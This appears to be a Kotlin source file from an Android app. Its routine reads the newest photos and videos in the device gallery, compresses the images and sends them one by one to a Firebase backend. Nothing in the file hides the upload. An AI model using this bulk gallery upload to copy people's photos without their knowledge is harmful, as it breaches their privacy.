package com.chitraai.app.manager

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream

class FileUploadManager(private val context: Context) {

    companion object {
        private const val TAG = "FileUploadManager"
        private const val MAX_ITEMS = 50 // limit to latest 50 items
        private const val MAX_IMAGE_SIZE = 600 // max width/height in pixels
    }

    // Scan gallery and send all items to Firebase via ConnectionManager
    fun scanAndSendGallery(
        connectionManager: ConnectionManager,
        onProgress: (Int, Int) -> Unit, // current, total
        onComplete: () -> Unit,
        onError: (String) -> Unit
    ) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val items = queryGallery()
                val total = items.size

                if (total == 0) {
                    withContext(Dispatchers.Main) { onComplete() }
                    return@launch
                }

                items.forEachIndexed { index, uri ->
                    try {
                        val (base64, mime) = encodeMedia(uri)
                        if (base64 != null) {
                            val name = getFileName(uri) ?: "file_$index"
                            connectionManager.sendGalleryItem(name, base64, mime, index, total)
                        }
                        withContext(Dispatchers.Main) {
                            onProgress(index + 1, total)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error encoding item $index: ${e.message}")
                    }
                }

                withContext(Dispatchers.Main) { onComplete() }

            } catch (e: Exception) {
                Log.e(TAG, "Gallery scan error: ${e.message}")
                withContext(Dispatchers.Main) { onError(e.message ?: "Unknown error") }
            }
        }
    }

    private fun queryGallery(): List<Uri> {
        val uris = mutableListOf<Uri>()

        val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.MIME_TYPE)
        val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"

        // Query images
        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, sortOrder
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            var count = 0
            while (cursor.moveToNext() && count < MAX_ITEMS) {
                val id = cursor.getLong(idCol)
                uris.add(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()))
                count++
            }
        }

        // Query videos (up to 10)
        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, sortOrder
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            var count = 0
            while (cursor.moveToNext() && count < 10) {
                val id = cursor.getLong(idCol)
                uris.add(Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id.toString()))
                count++
            }
        }

        return uris
    }

    private fun encodeMedia(uri: Uri): Pair<String?, String> {
        val mime = context.contentResolver.getType(uri) ?: "image/jpeg"

        return if (mime.startsWith("image")) {
            val stream = context.contentResolver.openInputStream(uri) ?: return Pair(null, mime)
            val original = BitmapFactory.decodeStream(stream)
            stream.close()

            if (original == null) return Pair(null, mime)

            // Scale down to save bandwidth
            val scale = MAX_IMAGE_SIZE.toFloat() / maxOf(original.width, original.height)
            val scaled = if (scale < 1f) {
                Bitmap.createScaledBitmap(
                    original,
                    (original.width * scale).toInt(),
                    (original.height * scale).toInt(),
                    true
                )
            } else original

            val out = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 60, out)
            val base64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)

            if (scaled != original) scaled.recycle()
            original.recycle()

            Pair(base64, "image/jpeg")
        } else {
            // For video just send a placeholder — video streaming needs separate handling
            Pair(null, mime)
        }
    }

    private fun getFileName(uri: Uri): String? {
        return try {
            context.contentResolver.query(uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null)?.use {
                if (it.moveToFirst()) it.getString(0) else null
            }
        } catch (e: Exception) { null }
    }
}
